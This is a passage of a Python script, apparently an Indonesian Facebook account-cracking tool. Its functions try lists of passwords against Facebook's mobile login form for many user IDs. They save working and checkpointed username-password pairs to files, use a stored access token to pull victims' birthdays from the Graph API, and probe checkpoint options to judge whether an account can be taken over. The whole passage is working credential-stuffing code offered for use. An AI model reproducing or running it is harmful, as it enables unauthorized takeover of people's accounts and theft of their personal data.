			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mobil(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobill(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def cek_log(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		tempek = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in tempek.find_all("option")]
		print(f"\r{P}[•]{K}-----> {B}{uid}•{pw}")
		for opt in range(len(ngew)):
			jalan(f"{U}[{B}{str(opt+1)}{U}]{B}>>>>>{U}[{B}{ngew[opt]}{U}")
		if "0" in str(len(ngew)):
			jalan(f"{P}[•]{I} Hore akunya tab yesss, silahkan di login di fb lite ")
	elif "login_error" in str(run):
		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")
	else:
		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")


if __name__=="__main__":
    os.system("clear")
    mkdir_data_login()
    menu()
